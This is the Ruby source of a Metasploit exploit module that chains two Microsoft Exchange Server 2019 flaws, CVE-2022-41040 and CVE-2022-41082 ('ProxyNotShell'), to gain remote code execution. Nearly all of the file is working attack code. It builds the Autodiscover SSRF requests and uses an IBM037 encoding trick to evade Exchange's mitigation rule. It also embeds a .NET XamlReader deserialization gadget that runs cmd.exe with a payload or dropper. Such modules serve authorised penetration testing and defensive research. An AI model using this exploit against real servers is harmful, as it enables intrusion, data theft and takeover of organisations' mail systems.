##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HTTP::Exchange
  include Msf::Exploit::Remote::HTTP::Exchange::ProxyMaybeShell
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Exchange ProxyNotShell RCE',
        'Description' => %q{
          This module chains two vulnerabilities on Microsoft Exchange Server
          that, when combined, allow an authenticated attacker to interact with
          the Exchange Powershell backend (CVE-2022-41040), where a
          deserialization flaw can be leveraged to obtain code execution
          (CVE-2022-41082). This exploit only support Exchange Server 2019.

          These vulnerabilities were patched in November 2022.
        },
        'Author' => [
          'Orange Tsai', # Discovery of ProxyShell SSRF
          'Spencer McIntyre', # Metasploit module
          'DA-0x43-Dx4-DA-Hx2-Tx2-TP-S-Q', # Vulnerability analysis
          'Piotr Bazydło', # Vulnerability analysis
          'Rich Warren', # EEMS bypass via ProxyNotRelay
          'Soroush Dalili' # EEMS bypass
        ],
        'References' => [
          [ 'CVE', '2022-41040' ], # ssrf
          [ 'CVE', '2022-41082' ], # rce
          [ 'URL', 'https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend' ],
          [ 'URL', 'https://msrc-blog.microsoft.com/2022/09/29/customer-guidance-for-reported-zero-day-vulnerabilities-in-microsoft-exchange-server/' ],
          [ 'URL', 'https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9' ],
          [ 'URL', 'https://rw.md/2022/11/09/ProxyNotRelay.html' ]
        ],
        'DisclosureDate' => '2022-09-28', # announcement of limited details, patched 2022-11-08
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Platform' => ['windows'],
        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
        'Privileged' => true,
        'Targets' => [
          [
            'Windows Dropper',
            {
              'Platform' => 'windows',
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :windows_dropper
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'windows',
              'Arch' => [ARCH_CMD],
              'Type' => :windows_command
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'AKA' => ['ProxyNotShell'],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options([
      OptString.new('USERNAME', [ true, 'A specific username to authenticate as' ]),
      OptString.new('PASSWORD', [ true, 'The password to authenticate with' ]),
      OptString.new('DOMAIN', [ false, 'The domain to authenticate to' ])
    ])

    register_advanced_options([
      OptEnum.new('EemsBypass', [ true, 'Technique to bypass the EEMS rule', 'IBM037v1', %w[IBM037v1 none]])
    ])
  end

  def check
    @ssrf_email ||= Faker::Internet.email
    res = send_http('GET', '/mapi/nspi/')
    return CheckCode::Unknown if res.nil?
    return CheckCode::Unknown('Server responded with 401 Unauthorized.') if res.code == 401
    return CheckCode::Safe unless res.code == 200 && res.get_html_document.xpath('//head/title').text == 'Exchange MAPI/HTTP Connectivity Endpoint'

    # actually run the powershell cmdlet and see if it works, this will fail if:
    #   * the credentials are incorrect (USERNAME, PASSWORD, DOMAIN)
    #   * the exchange emergency mitigation service M1 rule is in place
    return CheckCode::Safe unless execute_powershell('Get-Mailbox')

    CheckCode::Vulnerable
  rescue Msf::Exploit::Failed => e
    CheckCode::Safe(e.to_s)
  end

  def ibm037(string)
    string.encode('IBM037').force_encoding('ASCII-8BIT')
  end

  def send_http(method, uri, opts = {})
    opts[:authentication] = {
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD'],
      'preferred_auth' => 'NTLM'
    }

    if uri =~ /powershell/i && datastore['EemsBypass'] == 'IBM037v1'
      uri = "/Autodiscover/autodiscover.json?#{ibm037(@ssrf_email + uri + '?')}&#{ibm037('Email')}=#{ibm037('Autodiscover/autodiscover.json?' + @ssrf_email)}"
      opts[:headers] = {
        'X-Up-Devcap-Post-Charset' => 'IBM037',
        # technique needs the "UP" prefix, see: https://github.com/Microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System/net/System/Net/HttpListenerRequest.cs#L362
        'User-Agent' => "UP #{datastore['UserAgent']}"
      }
    else
      uri = "/Autodiscover/autodiscover.json?#{@ssrf_email + uri}?&Email=Autodiscover/autodiscover.json?#{@ssrf_email}"
    end

    super(method, uri, opts)
  end

  def exploit
    # if we're doing pre-exploit checks, make sure the target is Exchange Server 2019 because the XamlGadget does not
    # work on Exchange Server 2016
    if datastore['AutoCheck'] && !datastore['ForceExploit'] && (version = exchange_get_version)
      vprint_status("Detected Exchange version: #{version}")
      if version < Rex::Version.new('15.2')
        fail_with(Failure::NoTarget, 'This exploit is only compatible with Exchange Server 2019 (version 15.2)')
      end
    end

    @ssrf_email ||= Faker::Internet.email

    case target['Type']
    when :windows_command
      vprint_status("Generated payload: #{payload.encoded}")
      execute_command(payload.encoded)
    when :windows_dropper
      execute_cmdstager({ linemax: 7_500 })
    end
  end

  def execute_command(cmd, _opts = {})
    xaml = Nokogiri::XML(<<-XAML, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root
      <ResourceDictionary
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:System="clr-namespace:System;assembly=mscorlib"
        xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
        <ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start">
          <ObjectDataProvider.MethodParameters>
            <System:String>cmd.exe</System:String>
            <System:String>/c #{cmd.encode(xml: :text)}</System:String>
          </ObjectDataProvider.MethodParameters>
        </ObjectDataProvider>
      </ResourceDictionary>
    XAML

    identity = Nokogiri::XML(<<-IDENTITY, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root
      <Obj N="V" RefId="14">
        <TN RefId="1">
        <T>System.ServiceProcess.ServiceController</T>
          <T>System.Object</T>
        </TN>
        <ToString>Object</ToString>
        <Props>
          <S N="Name">Type</S>
          <Obj N="TargetTypeForDeserialization">
            <TN RefId="1">
              <T>System.Exception</T>
              <T>System.Object</T>
            </TN>
            <MS>
              <BA N="SerializationData">
                #{Rex::Text.encode_base64(XamlLoaderGadget.generate.to_binary_s)}
              </BA>
            </MS>
          </Obj>
        </Props>
        <S>
          <![CDATA[#{xaml}]]>
        </S>
      </Obj>
    IDENTITY

    execute_powershell('Get-Mailbox', args: [
      { name: '-Identity', value: identity }
    ])
  end
end

class XamlLoaderGadget < Msf::Util::DotNetDeserialization::Types::SerializedStream
  include Msf::Util::DotNetDeserialization

  def self.generate
    from_values([
      Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
      Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
        class_info: Types::General::ClassInfo.new(
          obj_id: 1,
          name: 'System.UnitySerializationHolder',
          member_names: %w[Data UnityType AssemblyName]
        ),
        member_type_info: Types::General::MemberTypeInfo.new(
          binary_type_enums: %i[String Primitive String],
          additional_infos: [ 8 ]
        ),
        member_values: [
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 2,
            string: 'System.Windows.Markup.XamlReader'
          )),
          4,
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 3,
            string: 'PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'
          ))
        ]
      ),
      Types::RecordValues::MessageEnd.new
    ])
  end
end
